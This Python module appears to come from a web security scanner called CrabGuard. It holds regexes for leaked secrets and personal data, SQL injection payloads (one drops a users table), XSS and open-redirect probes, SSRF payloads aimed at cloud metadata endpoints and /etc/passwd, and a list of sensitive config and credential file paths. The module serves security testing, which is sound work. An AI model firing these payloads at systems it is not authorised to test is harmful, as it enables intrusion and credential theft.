"""
CrabGuard – Detection patterns & payloads
"""
import re

# ── Sensitive data patterns ───────────────────────────────────────────────────
SENSITIVE_PATTERNS = {
    "AWS Access Key":      re.compile(r"AKIA[0-9A-Z]{16}"),
    "AWS Secret Key":      re.compile(r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]"),
    "Google API Key":      re.compile(r"AIza[0-9A-Za-z\\-_]{35}"),
    "Private Key Block":   re.compile(r"-----BEGIN (RSA |EC )?PRIVATE KEY-----"),
    "Password in URL":     re.compile(r"(?i)(password|passwd|pwd)=[^&\s]{3,}"),
    "Bearer Token":        re.compile(r"(?i)bearer\s+[a-zA-Z0-9\-_=]+\.[a-zA-Z0-9\-_=]+\.?"),
    "Basic Auth in URL":   re.compile(r"https?://[^:]+:[^@]+@"),
    "JWT Token":           re.compile(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+"),
    "Credit Card":         re.compile(r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6011[0-9]{12})\b"),
    "SSN":                 re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    "Internal IP":         re.compile(r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b"),
    "Email Address":       re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"),
}

# ── SQL Injection payloads ────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' AND SLEEP(2)--",
    "1 UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "1' ORDER BY 100--",
    "' AND 1=CONVERT(int,@@version)--",
]

SQLI_ERROR_PATTERNS = [
    re.compile(p, re.I) for p in [
        r"sql syntax",
        r"mysql_fetch",
        r"ORA-\d{5}",
        r"pg_query\(\)",
        r"sqlite3\.OperationalError",
        r"Microsoft SQL Server",
        r"Unclosed quotation mark",
        r"syntax error.*near",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlException",
        r"com\.mysql\.jdbc",
        r"Zend_Db",
        r"PSQLException",
        r"SQLite/JDBCDriver",
        r"System\.Data\.SqlClient",
    ]
]

# ── XSS payloads ─────────────────────────────────────────────────────────────
XSS_CANARY   = "CG_XSS_7x3k"
XSS_PAYLOADS = [
    f"<script>alert('{XSS_CANARY}')</script>",
    f"<img src=x onerror=alert('{XSS_CANARY}')>",
    f"'\"><script>alert('{XSS_CANARY}')</script>",
    f"javascript:alert('{XSS_CANARY}')",
    f"<svg onload=alert('{XSS_CANARY}')>",
]

# ── Open redirect payloads ────────────────────────────────────────────────────
REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "returnUrl", "next", "url", "target", "dest", "destination",
    "goto", "link", "location", "forward",
]
REDIRECT_PAYLOADS = [
    "https://evil.crabguard-test.com",
    "//evil.crabguard-test.com",
    "/\\evil.crabguard-test.com",
]

# ── SSRF payloads ─────────────────────────────────────────────────────────────
SSRF_PARAMS = [
    "url", "uri", "href", "src", "source", "dest", "destination",
    "redirect", "proxy", "load", "fetch", "api", "endpoint",
]
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",            # GCP metadata
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
]

# ── Sensitive file paths for discovery ────────────────────────────────────────
SENSITIVE_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.git/config",
    "/.git/HEAD",
    "/.htaccess",
    "/.htpasswd",
    "/backup.sql",
    "/backup.zip",
    "/db.sql",
    "/database.sql",
    "/wp-config.php",
    "/config.php",
    "/config.yml",
    "/config.yaml",
    "/settings.py",
    "/web.config",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/admin",
    "/admin/",
    "/administrator",
    "/phpmyadmin",
    "/phpmyadmin/",
    "/wp-admin",
    "/wp-login.php",
    "/login",
    "/api/v1",
    "/api/v2",
    "/swagger",
    "/swagger-ui.html",
    "/swagger/index.html",
    "/api-docs",
    "/openapi.json",
    "/graphql",
    "/.DS_Store",
    "/Thumbs.db",
    "/server-status",
    "/server-info",
    "/_profiler",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/.well-known/security.txt",
]

# ── Vulnerable JS library signatures ─────────────────────────────────────────
VULN_JS_LIBS = {
    "jquery": {
        "pattern": re.compile(r"jquery[.-](\d+\.\d+\.?\d*)(?:\.min)?\.js", re.I),
        "vuln_below": (3, 0, 0),
        "cve": "CVE-2019-11358",
        "description": "jQuery < 3.0.0 has Prototype Pollution vulnerability",
    },
    "bootstrap": {
        "pattern": re.compile(r"bootstrap[.-](\d+\.\d+\.?\d*)(?:\.min)?\.js", re.I),
        "vuln_below": (3, 4, 1),
        "cve": "CVE-2019-8331",
        "description": "Bootstrap < 3.4.1 / < 4.3.1 has XSS vulnerability",
    },
    "lodash": {
        "pattern": re.compile(r"lodash[.-](\d+\.\d+\.?\d*)(?:\.min)?\.js", re.I),
        "vuln_below": (4, 17, 21),
        "cve": "CVE-2021-23337",
        "description": "Lodash < 4.17.21 has Prototype Pollution / Command Injection",
    },
    "moment": {
        "pattern": re.compile(r"moment[.-](\d+\.\d+\.?\d*)(?:\.min)?\.js", re.I),
        "vuln_below": (2, 29, 4),
        "cve": "CVE-2022-24785",
        "description": "Moment.js < 2.29.4 has Path Traversal vulnerability",
    },
    "angular": {
        "pattern": re.compile(r"angular[.-](\d+\.\d+\.?\d*)(?:\.min)?\.js", re.I),
        "vuln_below": (1, 8, 0),
        "cve": "CVE-2023-26117",
        "description": "AngularJS < 1.8.x has ReDoS vulnerability",
    },
}
